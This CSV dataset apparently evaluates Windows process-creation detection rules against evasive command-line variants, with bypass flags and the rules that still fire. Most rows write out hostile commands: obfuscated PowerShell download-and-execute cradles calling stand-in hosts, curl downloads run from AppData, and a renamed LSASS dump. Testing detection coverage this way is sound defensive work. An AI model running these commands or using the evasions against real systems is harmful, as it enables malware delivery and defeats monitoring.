Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1219,proc_creation_win_webshell_recon_commands_and_processes,Webshell Detection With Command Line Keywords,bed2a484-9348-4143-8a8a-b801c979301c,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /""NoLogo"" -NonInteractive /""ExecutionPolicy"" Bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",TRUE,TRUE,FALSE,PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1219,proc_creation_win_webshell_recon_commands_and_processes,Webshell Detection With Command Line Keywords,bed2a484-9348-4143-8a8a-b801c979301c,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nOlOgO -nONINtERaCTIvE -""ExecutionPolicy"" Bypass -CoMManD ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",TRUE,TRUE,FALSE,PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1219,proc_creation_win_webshell_recon_commands_and_processes,Webshell Detection With Command Line Keywords,bed2a484-9348-4143-8a8a-b801c979301c,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -""NoLogo"" -NonInteractive -exEcutiONPoliCY Bypass /""Command"" ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",TRUE,TRUE,FALSE,PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1219,proc_creation_win_webshell_recon_commands_and_processes,Webshell Detection With Command Line Keywords,bed2a484-9348-4143-8a8a-b801c979301c,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NOLoGO -nONiNtERactivE -ep Bypass -""Command"" ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",TRUE,TRUE,FALSE,PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1219,proc_creation_win_webshell_recon_commands_and_processes,Webshell Detection With Command Line Keywords,bed2a484-9348-4143-8a8a-b801c979301c,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo -""NonInteractive"" -eXecutiOnpOLIcY Bypass -coMMAnd ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",TRUE,TRUE,FALSE,PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1219,proc_creation_win_webshell_recon_commands_and_processes,Webshell Detection With Command Line Keywords,bed2a484-9348-4143-8a8a-b801c979301c,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NOlOgO -noNInteractivE -ep Bypass -""Command"" ""IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')""",TRUE,TRUE,FALSE,PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Download and Execute Pattern (e6c54d94-498c-4562-a37c-b469d8e9a275); Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); Suspicious Program Names (efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6); PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1219,proc_creation_win_webshell_tool_recon,Webshell Tool Reconnaissance Activity,f64e5c19-879c-4bae-b471-6d84c8339677,,"cmd.exe /c ""p^y^t^h^o^n -h""",TRUE,TRUE,TRUE,
t1068,proc_creation_win_hktl_winpwn,HackTool - WinPwn Execution,d557dc06-62e8-4468-a8e8-7984124908ce,,"powershell.exe -ExecutionPolicy bypass /""file"" C:\temp\audit.ps1",TRUE,TRUE,FALSE,Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1068,proc_creation_win_hktl_winpwn,HackTool - WinPwn Execution,d557dc06-62e8-4468-a8e8-7984124908ce,,"powershell.exe -""ep"" bypass -FILE C:\temp\audit.ps1",TRUE,TRUE,TRUE,
t1548,proc_creation_win_susp_abusing_debug_privilege,Abused Debug Privilege by Arbitrary Parent Processes,d522eca2-2973-4391-a3e0-ef0374321dae,,"C:\WINDOWS\system32\cmd.exe /c powershell.exe -nop -w hidden -command ""New-Item -ItemType File C:\art-marker.txt; # route ADD """" frame",TRUE,TRUE,TRUE,
t1548,proc_creation_win_hktl_winpwn,HackTool - WinPwn Execution,d557dc06-62e8-4468-a8e8-7984124908ce,,"powershell.exe -ExecutionPolicy bypass /""file"" C:\temp\audit.ps1",TRUE,TRUE,FALSE,Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1036,proc_creation_win_sysinternals_procdump_evasion,Potential SysInternals ProcDump Evasion,79b06761-465f-4f88-9ef2-150e24d3d737,,"powershell.exe -""Command"" ""Move-Item -Path .\lsass.exe_220111_085234.dmp -Destination .\app_crash.log""",TRUE,TRUE,FALSE,LSASS Dump Keyword In CommandLine (ffa6861c-4461-4f59-8a41-578c39f3f23e); LSASS Dump Keyword In CommandLine (ffa6861c-4461-4f59-8a41-578c39f3f23e)
t1036,proc_creation_win_sysinternals_procdump_evasion,Potential SysInternals ProcDump Evasion,79b06761-465f-4f88-9ef2-150e24d3d737,,"powershell.exe /""Command"" ""Move-Item -Path .\lsass.exe_220111_085234.dmp -Destination .\app_crash.log""",TRUE,TRUE,FALSE,LSASS Dump Keyword In CommandLine (ffa6861c-4461-4f59-8a41-578c39f3f23e); LSASS Dump Keyword In CommandLine (ffa6861c-4461-4f59-8a41-578c39f3f23e)
t1036,proc_creation_win_susp_commandline_path_traversal_evasion,Potential Command Line Path Traversal Evasion Attempt,1327381e-6ab0-4f38-b583-4c1b8346a56b,,"C:\Windows\System32\cmd.exe /c ""C:\Windows/../Windows/System32/calc.exe""",TRUE,TRUE,TRUE,
t1036,proc_creation_win_sysinternals_procdump_evasion,Potential SysInternals ProcDump Evasion,79b06761-465f-4f88-9ef2-150e24d3d737,,"powershell.exe -""Command"" ""Move-Item -Path .\lsass.exe_220111_085234.dmp -Destination .\app_crash.log""",TRUE,TRUE,FALSE,LSASS Dump Keyword In CommandLine (ffa6861c-4461-4f59-8a41-578c39f3f23e); LSASS Dump Keyword In CommandLine (ffa6861c-4461-4f59-8a41-578c39f3f23e)
t1036,proc_creation_win_sysinternals_procdump_evasion,Potential SysInternals ProcDump Evasion,79b06761-465f-4f88-9ef2-150e24d3d737,,"powershell.exe /""Command"" ""Move-Item -Path .\lsass.exe_220111_085234.dmp -Destination .\app_crash.log""",TRUE,TRUE,FALSE,LSASS Dump Keyword In CommandLine (ffa6861c-4461-4f59-8a41-578c39f3f23e); LSASS Dump Keyword In CommandLine (ffa6861c-4461-4f59-8a41-578c39f3f23e)
t1027.009,proc_creation_win_powershell_token_obfuscation,Powershell Token Obfuscation - Process Creation,deb9b646-a508-44ee-b7c9-d8965921c6b6,,"powershell.exe /""c"" ""$c1='Invoke-'; $c2='Expression'; $run=$c1+$c2; &$run (.('New-Object') Net.WebClient).DownloadString('http://malicious.local/payload')""",TRUE,TRUE,FALSE,PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1027.009,proc_creation_win_powershell_token_obfuscation,Powershell Token Obfuscation - Process Creation,deb9b646-a508-44ee-b7c9-d8965921c6b6,,"powershell.exe -""c"" ""$c1='Invoke-'; $c2='Expression'; $run=$c1+$c2; &$run (.('New-Object') Net.WebClient).DownloadString('http://malicious.local/payload')""",TRUE,TRUE,FALSE,PowerShell Download Pattern (3b6ab547-8ec2-4991-b9d2-2b06702a48d7); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1027.009,proc_creation_win_powershell_token_obfuscation,Powershell Token Obfuscation - Process Creation,deb9b646-a508-44ee-b7c9-d8965921c6b6,,"powershell.exe /""c"" ""&('In'+'voke-E'+'xpression') (.('Ne'+'w-Ob'+'ject') Net.WebClient).DownloadString('http://malicious.local/payload')""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1036.002,proc_creation_win_susp_right_to_left_override,Potential Defense Evasion Via Right-to-Left Override,ad691d92-15f2-4181-9aa4-723c74f9ddc3,,"powershell.exe -Command ""$rtlo = [char]0x202E; & ""C:\Users\thaim\Desktop\evil_batch${rtlo}fdp.bat""""",TRUE,TRUE,FALSE,Potential PowerShell Obfuscation Via WCHAR/CHAR (e312efd0-35a1-407f-8439-b8d434b438a6); Potential PowerShell Obfuscation Via WCHAR/CHAR (e312efd0-35a1-407f-8439-b8d434b438a6)
t1036.003,proc_creation_win_susp_copy_system_dir,Suspicious Copy From or To System Directory,fff9d2b7-e11c-4a69-93d3-40ef66189767,,"""cmd.exe"" /c c^o^p^y %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe",TRUE,TRUE,TRUE,
t1036.003,proc_creation_win_susp_copy_system_dir_lolbin,LOL-Binary Copied From System Directory,f5d19838-41b5-476c-98d8-ba8af4929ee2,,"powershell.exe /""NoP"" -c ""[System.IO.File]::Copy('C:\Windows\System32\rundll32.exe', 'C:\Temp\rundll32.exe')""",TRUE,TRUE,TRUE,
t1036.003,proc_creation_win_susp_copy_system_dir_lolbin,LOL-Binary Copied From System Directory,f5d19838-41b5-476c-98d8-ba8af4929ee2,,"powershell.exe -""NoP"" /""c"" ""[System.IO.File]::Copy('C:\Windows\System32\rundll32.exe', 'C:\Temp\rundll32.exe')""",TRUE,TRUE,TRUE,
t1036.003,proc_creation_win_susp_copy_system_dir_lolbin,LOL-Binary Copied From System Directory,f5d19838-41b5-476c-98d8-ba8af4929ee2,,"powershell.exe -NoP -""c"" ""[System.IO.File]::Copy('C:\Windows\System32\rundll32.exe', 'C:\Temp\rundll32.exe')""",TRUE,TRUE,TRUE,
t1036.003,proc_creation_win_susp_copy_system_dir_lolbin,LOL-Binary Copied From System Directory,f5d19838-41b5-476c-98d8-ba8af4929ee2,,"powershell.exe -NOp -""c"" ""[System.IO.File]::Copy('C:\Windows\System32\rundll32.exe', 'C:\Temp\rundll32.exe')""",TRUE,TRUE,TRUE,
t1090,proc_creation_win_pua_chisel,PUA - Chisel Tunneling Tool Execution,8b0e12da-d3c3-49db-bb4f-256703f380e5,,"powershell.exe /""enc"" JABjAGwA... (encoded command with chisel)",TRUE,TRUE,TRUE,
t1090,proc_creation_win_java_manageengine_susp_child_process,Suspicious Child Process Of Manage Engine ServiceDesk,cea2b7ea-792b-405f-95a1-b903ea06458f,,"C:\Windows\System32\cmd.exe /c powershell.exe -nop /""ep"" bypass",TRUE,TRUE,TRUE,
t1090,proc_creation_win_java_manageengine_susp_child_process,Suspicious Child Process Of Manage Engine ServiceDesk,cea2b7ea-792b-405f-95a1-b903ea06458f,,"C:\Windows\System32\cmd.exe /c powershell.exe -nop -""ep"" bypass",TRUE,TRUE,TRUE,
t1090,proc_creation_win_java_manageengine_susp_child_process,Suspicious Child Process Of Manage Engine ServiceDesk,cea2b7ea-792b-405f-95a1-b903ea06458f,,"C:\Windows\System32\cmd.exe /C powershell.exe /""nop"" -ep bypass",TRUE,TRUE,FALSE,Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1105,proc_creation_win_cmd_curl_download_exec_combo,Curl Download And Execute Combination,21dd6d38-2b18-4453-9404-a0fe4a0cc288,,"powershell.exe -""c"" ""curl http://example.com/payload.exe -o payload.exe ; .\payload.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_curl_download_exec_combo,Curl Download And Execute Combination,21dd6d38-2b18-4453-9404-a0fe4a0cc288,,"powershell.exe /""c"" ""curl http://example.com/payload.exe -o payload.exe ; .\payload.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_browsers_chromium_headless_exec,Browser Execution In Headless Mode,ef9dcfed-690c-4c5d-a9d1-482cd422225c,,wmic useraccount where name='guest' set passwordexpires=0,TRUE,TRUE,TRUE,
t1105,proc_creation_win_browsers_chromium_headless_exec,Browser Execution In Headless Mode,ef9dcfed-690c-4c5d-a9d1-482cd422225c,,wmic path Win32_UserAccount where name='guest' set passwordexpires=false,TRUE,TRUE,FALSE,Password Set to Never Expire via WMI (7864a175-3654-4824-9f0d-f0da18ab27c0)
t1105,proc_creation_win_cmd_curl_download_exec_combo,Curl Download And Execute Combination,21dd6d38-2b18-4453-9404-a0fe4a0cc288,,"powershell.exe -""c"" ""curl http://example.com/payload.exe -o payload.exe ; .\payload.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_curl_download_exec_combo,Curl Download And Execute Combination,21dd6d38-2b18-4453-9404-a0fe4a0cc288,,"powershell.exe /""c"" ""curl http://example.com/payload.exe -o payload.exe ; .\payload.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe -""Command"" ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe /""Command"" ""Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\test.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%""",TRUE,TRUE,FALSE,Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%""",TRUE,TRUE,FALSE,Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"powershell.exe /""Command"" ""Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\payload.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1105,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl http://example.com/payload.exe -o %USERPROFILE%\AppData\Roaming\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
